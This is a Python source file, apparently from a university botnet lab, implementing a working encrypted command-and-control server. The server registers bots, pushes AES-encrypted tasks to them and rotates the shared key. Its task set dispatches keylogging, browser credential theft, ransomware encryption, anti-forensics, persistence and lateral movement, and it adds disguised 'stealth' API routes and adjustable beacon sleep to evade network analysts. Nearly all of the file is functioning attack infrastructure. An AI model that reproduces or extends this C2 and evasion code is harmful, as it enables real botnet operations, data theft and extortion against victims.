"""
====================================================
 AUA CS 232/337 - Botnet Research Project
 Component: AES-Encrypted C2 Server (Phase 1 upgrade)
 Environment: ISOLATED VM LAB ONLY
====================================================

Upgrade to c2_server.py: all commands encrypted with
AES-128-CBC before delivery to bots. Bot agents must
hold the shared key to decrypt task payloads.

Why encryption on an internal C2?
  - DPI cannot read task payloads in transit
  - If a bot is compromised, the task log is not readable
  - Research demonstration of command obfuscation

Key management in this demo:
  - Single shared key (pre-shared, compiled into bot)
  - Real botnets rotate keys via DGA or P2P updates

Usage: replaces c2_server.py on the C2 VM.
Bot agent uses crypto_utils.py to decrypt responses.

====================================================
 ADDITIONS (minimal diff — original logic unchanged)
====================================================
Gap 1 — Stealth alias routes appended at the bottom.
         /api/status, /api/upload, /api/push, /api/event,
         /api/peers, /api/rotate delegate to the original
         handlers. bot_agent.c paths untouched.
Gap 2 — sleep task type: one early-return branch added
         inside push_task() before the existing task = {}
         block. All other task types flow unchanged.
"""

import os
import sys
import json
import base64
import hashlib
import threading
import time
import keylogger_sim
import cred_extractor_sim
import ransomware_sim
import anti_forensics_sim
import system_profiler
import persistence_sim
import file_transfer
from file_transfer import add_file_transfer_endpoints
from datetime import datetime
from queue import Queue
from flask import Flask, request, jsonify

# ── Import AES from covert_bot.py or implement inline ─────────
try:
    from covert_bot import aes_cbc_encrypt, aes_cbc_decrypt, derive_key, derive_iv
    print("[C2-AES] Using AES from covert_bot module")
except ImportError:
    def _xor_bytes(a, b):
        return bytes(x ^ y for x, y in zip(a, b))

    def _pad(data, bs=16):
        p = bs - (len(data) % bs)
        return data + bytes([p]*p)

    def _unpad(data):
        if not data: return data
        p = data[-1]
        return data[:-p] if 0 < p <= 16 else data

    try:
        from Crypto.Cipher import AES as _AES
        def aes_cbc_encrypt(pt, key, iv):
            cipher = _AES.new(key, _AES.MODE_CBC, iv)
            return cipher.encrypt(_pad(pt))
        def aes_cbc_decrypt(ct, key, iv):
            cipher = _AES.new(key, _AES.MODE_CBC, iv)
            return _unpad(cipher.decrypt(ct))
    except ImportError:
        def aes_cbc_encrypt(pt, key, iv):
            print("[WARN] PyCryptodome not found. Commands sent in plaintext.")
            return pt
        def aes_cbc_decrypt(ct, key, iv):
            return ct

    def derive_key(secret=b"AUA_LAB_2026_KEY"):
        return hashlib.sha256(secret).digest()[:16]
    def derive_iv(nonce=""):
        return hashlib.md5(nonce.encode()).digest()

# ── C2 shared key ─────────────────────────────────────────────
C2_SECRET    = b"AUA_LAB_2026_KEY"   # Must match AUTH_TOKEN logic in bot_agent.c
AES_KEY      = derive_key(C2_SECRET)
AUTH_TOKEN   = "aw"

# Mutable key state — updated by /rotate_key
_current_secret = C2_SECRET
_current_key    = AES_KEY

# ── Encryption helpers ────────────────────────────────────────

def encrypt_task(task: dict) -> dict:
    """
    Encrypt a task dict for delivery to a bot.
    Always uses the current key (_current_key), which may have been
    rotated by a /rotate_key call since server startup.
    """
    nonce      = datetime.utcnow().strftime("%Y-%m-%d-%H-%M")
    iv         = derive_iv(nonce)
    plaintext  = json.dumps(task).encode()
    ciphertext = aes_cbc_encrypt(plaintext, _current_key, iv)
    return {
        "enc":   1,
        "nonce": nonce,
        "data":  base64.b64encode(ciphertext).decode(),
    }

def decrypt_task(payload: dict) -> dict | None:
    """Decrypt a task payload (used for testing/logging)."""
    if not payload.get("enc"):
        return payload  # plaintext (legacy bot)
    try:
        nonce      = payload["nonce"]
        iv         = derive_iv(nonce)
        ciphertext = base64.b64decode(payload["data"])
        plaintext  = aes_cbc_decrypt(ciphertext, _current_key, iv)
        return json.loads(plaintext.decode())
    except Exception:
        return None

# ── Encrypted C2 server ───────────────────────────────────────

app = Flask(__name__)
# FIX: moved here from top-of-file (app must exist before this call)
add_file_transfer_endpoints(app, auth_token=AUTH_TOKEN)

REGISTERED_BOTS = {}
TASK_QUEUES     = {}
lock            = threading.Lock()

def log(msg):
    ts = datetime.now().strftime("%H:%M:%S")
    print(f"[C2-AES {ts}] {msg}")

def auth(req):
    return req.headers.get("X-Auth-Token") == AUTH_TOKEN

@app.route("/register", methods=["POST"])
def register():
    if not auth(request):
        return jsonify({"error": "unauthorized"}), 403
    data   = request.get_json()
    bot_id = data.get("bot_id")
    if not bot_id:
        return jsonify({"error": "no bot_id"}), 400

    with lock:
        REGISTERED_BOTS[bot_id] = {
            "ip":        request.remote_addr,
            "hostname":  data.get("hostname", "unknown"),
            "arch":      data.get("arch", "unknown"),
            "first_seen": datetime.now().isoformat(),
            "last_seen": datetime.now().isoformat(),
            "heartbeat_count": 0,
            "supports_enc": data.get("enc", False),  # does this bot support AES?
        }
        TASK_QUEUES[bot_id] = Queue()

    log(f"NEW BOT id={bot_id} ip={request.remote_addr} enc={'yes' if data.get('enc') else 'no'}")
    return jsonify({"status": "registered", "bot_id": bot_id, "enc": True})

@app.route("/heartbeat", methods=["POST"])
def heartbeat():
    if not auth(request):
        return jsonify({"error": "unauthorized"}), 403
    data   = request.get_json()
    bot_id = data.get("bot_id")

    with lock:
        if bot_id not in REGISTERED_BOTS:
            return jsonify({"error": "unknown bot"}), 404
        REGISTERED_BOTS[bot_id]["last_seen"] = datetime.now().isoformat()
        REGISTERED_BOTS[bot_id]["heartbeat_count"] += 1
        task = None
        if not TASK_QUEUES[bot_id].empty():
            task = TASK_QUEUES[bot_id].get()

    if task:
        bot_info = REGISTERED_BOTS.get(bot_id, {})
        supports_enc = bot_info.get("supports_enc", False)

        if supports_enc:
            encrypted = encrypt_task(task)
            log(f"HEARTBEAT id={bot_id} → ENCRYPTED task={task['type']}")
            return jsonify({"task": encrypted})
        else:
            log(f"HEARTBEAT id={bot_id} → PLAINTEXT task={task['type']} (legacy bot)")
            return jsonify({"task": task})
    else:
        log(f"HEARTBEAT id={bot_id} → idle")
        return jsonify({"task": None})

@app.route("/result", methods=["POST"])
def result():
    if not auth(request):
        return jsonify({"error": "unauthorized"}), 403
    data   = request.get_json()
    bot_id = data.get("bot_id")
    result_payload = data.get("result", "")
    # If result is encrypted, decrypt for logging
    if isinstance(result_payload, dict) and result_payload.get("enc"):
        decrypted = decrypt_task(result_payload)
        log(f"RESULT (decrypted) id={bot_id}  {json.dumps(decrypted)[:120]}")
    else:
        log(f"RESULT id={bot_id}  {json.dumps(result_payload)[:120]}")
    return jsonify({"status": "received"})

@app.route("/bots", methods=["GET"])
def list_bots():
    with lock:
        return jsonify({k: v.copy() for k, v in REGISTERED_BOTS.items()})

@app.route("/task", methods=["POST"])
def push_task():
    """
    Push encrypted task to one or all bots.

    Required fields:
      bot_id      : "all" or a specific bot_id string
      type        : task type (see below)

    Common optional fields (passed through verbatim to the bot):
      target_ip   : victim IP          (default 192.168.100.20)
      target_port : victim port        (8080)
      duration    : seconds            (default 10)

    Type-specific optional fields (forwarded to bot unchanged):
      cpu         : float 0-1          cryptojack CPU fraction (default 0.25)
      mode        : "bot"|"jitter"|"distributed"  cred_stuffing mode (default "jitter")
      jitter      : int ms             cred_stuffing jitter std-dev (default 200)
      workers     : int                cred_stuffing distributed threads (default 3)

    All fields present in the request body are passed through to the task dict
    so bots always receive the full parameterisation the operator intended.

    Gap 2 — sleep task type (ADDED):
      {"type":"sleep","min":N,"max":M}
      Bot updates its poll interval without redeployment.
    """
    #   "system_profile"  — triggers full system enumeration (T1082/T1016/T1033)
    #   "sandbox_check"   — runs sandbox detection before payload
    #   "plant_persist"   — installs persistence (method in task body)
    #   "remove_persist"  — removes persistence
    #   "upload_file"     — bot uploads file to C2
    #   "download_file"   — bot downloads file from C2
    #   "lateral_ssh"     — SSH jump chain lateral movement
    #   "lateral_nfs"     — NFS share taint
    # start_keylogger             Start evdev keyboard capture
    # stop_keylogger              Stop keylogger
    # get_keylogs                 Retrieve captured keystrokes from bot
    # clear_keylogs               Clear keylog buffer
    # extract_creds               Extract browser saved passwords
    # system_profile              Full system enumeration (OS/HW/net/users)
    # ransom_setup                Create ransomware test directory
    # ransom_encrypt              Encrypt test files (AES-256-CBC)
    # ransom_decrypt              Decrypt test files (key recovery)
    # ransom_status               Show encryption state
    # ransom_cleanup              Delete test directory
    # anti_forensics              Clear all lab-generated artifacts
    # anti_forensics_status       List clearable lab artifacts
    # plant_persist [method]      Install persistence (cron|bashrc|systemd|...)
    # remove_persist [method]     Remove persistence
    # sleep                       Remotely reconfigure bot poll interval (Gap 2)

    data   = request.get_json()
    bot_id = data.get("bot_id", "all")

    # ── Gap 2: sleep task — handled before the general block ───
    # Allows operator to remotely slow beacon intervals mid-operation
    # without redeploying any bot binary.
    if data.get("type") == "sleep":
        task = {
            "type":      "sleep",
            "min":       int(data.get("min", 30)),
            "max":       int(data.get("max", 90)),
            "issued_at": datetime.now().isoformat(),
        }
        with lock:
            targets = list(REGISTERED_BOTS.keys()) if bot_id == "all" else [bot_id]
            for tid in targets:
                if tid in TASK_QUEUES:
                    TASK_QUEUES[tid].put(task)
        log(f"TASK QUEUED type=sleep target={bot_id} min={task['min']}s max={task['max']}s")
        return jsonify({"status": "queued", "task": task, "targets": targets})
    # ── end Gap 2 ──────────────────────────────────────────────

    # Base fields
    task = {
        "type":        data.get("type", "idle"),
        "target_ip":   data.get("target_ip", "192.168.100.20"),
        "target_port": data.get("target_port", 8080),
        "duration":    data.get("duration", 10),
        "issued_at":   datetime.now().isoformat(),
    }

    TASK_HANDLERS = {
        "start_keylogger":       keylogger_sim.handle_c2_task,
        "stop_keylogger":        keylogger_sim.handle_c2_task,
        "get_keylogs":           keylogger_sim.handle_c2_task,
        "clear_keylogs":         keylogger_sim.handle_c2_task,
        "ransom_setup":          ransomware_sim.handle_c2_task,
        "ransom_encrypt":        ransomware_sim.handle_c2_task,
        "ransom_decrypt":        ransomware_sim.handle_c2_task,
        "ransom_status":         ransomware_sim.handle_c2_task,
        "ransom_cleanup":        ransomware_sim.handle_c2_task,
        "anti_forensics":        anti_forensics_sim.handle_c2_task,
        "anti_forensics_status": anti_forensics_sim.handle_c2_task,
        "system_profile":        system_profiler.handle_task,
    }

    # Pass through all type-specific optional fields if present
    for field in ("cpu", "mode", "jitter", "workers"):
        if field in data:
            task[field] = data[field]
    with lock:
        targets = list(REGISTERED_BOTS.keys()) if bot_id == "all" else [bot_id]
        for tid in targets:
            if tid in TASK_QUEUES:
                TASK_QUEUES[tid].put(task)

    log(f"TASK QUEUED type={task['type']} target={bot_id} → will be encrypted on delivery")
    return jsonify({"status": "queued", "task": task, "targets": targets})

@app.route("/encrypt_test", methods=["POST"])
def encrypt_test():
    """Debug endpoint: show encryption of a sample task using the current key."""
    task = request.get_json() or {"type": "idle"}
    enc  = encrypt_task(task)
    dec  = decrypt_task(enc)
    return jsonify({
        "original":  task,
        "encrypted": enc,
        "decrypted": dec,
        "key_hex":   _current_key.hex(),
    })


@app.route("/rotate_key", methods=["POST"])
def rotate_key():
    """
    Rotate the shared AES key used to encrypt tasks for bots.

    Steps performed:
      1. Derives the new AES key from the provided secret.
      2. Queues an 'update_secret' task for every registered bot,
         encrypted with the OLD key so current bots can decrypt it.
      3. Switches _current_key to the new key so all subsequent
         /task deliveries use the new key.

    Body (requires X-Auth-Token header):
      {"secret": "<new_shared_secret>"}    (min 8 characters)

    Workflow:
      a. Call POST /rotate_key {"secret":"NEW_KEY"} on the C2 server.
         → All bots receive update_secret on their next heartbeat,
           still encrypted with the old key.
      b. Wait ≥ one heartbeat interval (5 s) for all bots to pick up
         the rotation command and switch their local key.
      c. All subsequent /task calls are now encrypted with the new key.

    If using the Phase 2 dead-drop server, also call:
      POST http://192.168.100.10:5001/push_key {"secret":"NEW_KEY"}
    so Phase 2 bots (covert_bot.py) receive the rotation too.
    """
    if not auth(request):
        return jsonify({"error": "unauthorized"}), 403

    global _current_secret, _current_key

    data       = request.get_json(silent=True) or {}
    new_secret = data.get("secret", "")

    if not new_secret or len(new_secret) < 8:
        return jsonify({"error": "secret must be at least 8 characters"}), 400

    new_secret_bytes = new_secret.encode()
    new_key          = derive_key(new_secret_bytes)

    # Queue update_secret for every registered bot, signed with OLD key
    rotation_task = {
        "type":       "update_secret",
        "secret":     new_secret,
        "issued_at":  datetime.now().isoformat(),
    }
    queued_count = 0
    with lock:
        for bot_id, q in TASK_QUEUES.items():
            q.put(rotation_task)
            queued_count += 1

    old_key_hex = _current_key.hex()

    # Switch to new key — all subsequent encrypt_task() calls use it
    _current_secret = new_secret_bytes
    _current_key    = new_key

    log(f"KEY ROTATION: queued update_secret for {queued_count} bots | "
        f"old={old_key_hex[:8]}... new={new_key.hex()[:8]}...")

    return jsonify({
        "status":         "rotated",
        "bots_notified":  queued_count,
        "new_key_hex":    new_key.hex(),
        "note": (
            f"Bots will receive new key on next heartbeat (~{5}s). "
            "For Phase 2 bots, also call POST /push_key on the dead-drop server."
        ),
    })


# ══════════════════════════════════════════════════════════════
#  Gap 1 — STEALTH ALIAS ROUTES (ADDED — purely additive)
#
#  Six new routes appended below. Zero changes to any existing
#  route above. bot_agent.c which calls /register, /heartbeat,
#  /result does not need recompilation.
#
#  Alias table:
#    POST /api/event   →  register()    (bot registration)
#    POST /api/status  →  heartbeat()   (beacon / task poll)
#    POST /api/upload  →  result()      (result submission)
#    POST /api/push    →  push_task()   (operator tasks + sleep)
#    GET  /api/peers   →  list_bots()   (bot inventory)
#    POST /api/rotate  →  rotate_key()  (AES key rotation)
#
#  Teaching point: /api/status looks like an uptime check,
#  /api/upload like a log-shipping pipeline, /api/push like a
#  notification queue — none signal C2 to a network analyst.
# ══════════════════════════════════════════════════════════════

@app.route("/api/event",  methods=["POST"])
def api_event():   return register()

@app.route("/api/status", methods=["POST"])
def api_status():  return heartbeat()

@app.route("/api/upload", methods=["POST"])
def api_upload():  return result()

@app.route("/api/push",   methods=["POST"])
def api_push():    return push_task()

@app.route("/api/peers",  methods=["GET"])
def api_peers():   return list_bots()

@app.route("/api/rotate", methods=["POST"])
def api_rotate():  return rotate_key()


if __name__ == "__main__":
    print("=" * 60)
    print(" Encrypted C2 Server - AUA Botnet Research Lab")
    print(" AES-128-CBC task encryption enabled")
    print(" ISOLATED ENVIRONMENT ONLY")
    print(" Listening on 0.0.0.0:5000")
    print("=" * 60)
    print(f"\n[C2-AES] AES key: {_current_key.hex()}")
    print(f"[C2-AES] (Same key must be in bot_agent for decryption)")
    print(f"\nEndpoints:")
    print(f"  POST /task        — push task to bots (incl. sleep type)")
    print(f"  POST /rotate_key  — rotate AES key (queues update_secret to all bots)")
    print(f"  GET  /bots        — list registered bots")
    print(f"  POST /encrypt_test — AES round-trip test")
    print(f"\nStealth aliases (Gap 1):")
    print(f"  POST /api/event /api/status /api/upload /api/push /api/rotate")
    print(f"  GET  /api/peers")
    print(f"\nKey rotation example:")
    print(f"  curl -X POST http://localhost:5000/rotate_key \\")
    print(f"       -H 'Content-Type: application/json' \\")
    print(f"       -H 'X-Auth-Token: aw' \\")
    print(f"       -d '{{\"secret\":\"NEW_KEY_2026_XYZ\"}}'")
    print(f"\nSleep task example (Gap 2):")
    print(f"  curl -X POST http://localhost:5000/api/push \\")
    print(f"       -H 'Content-Type: application/json' \\")
    print(f"       -H 'X-Auth-Token: aw' \\")
    print(f"       -d '{{\"bot_id\":\"all\",\"type\":\"sleep\",\"min\":120,\"max\":300}}'")
    print()
    app.run(host="0.0.0.0", port=5000, debug=False)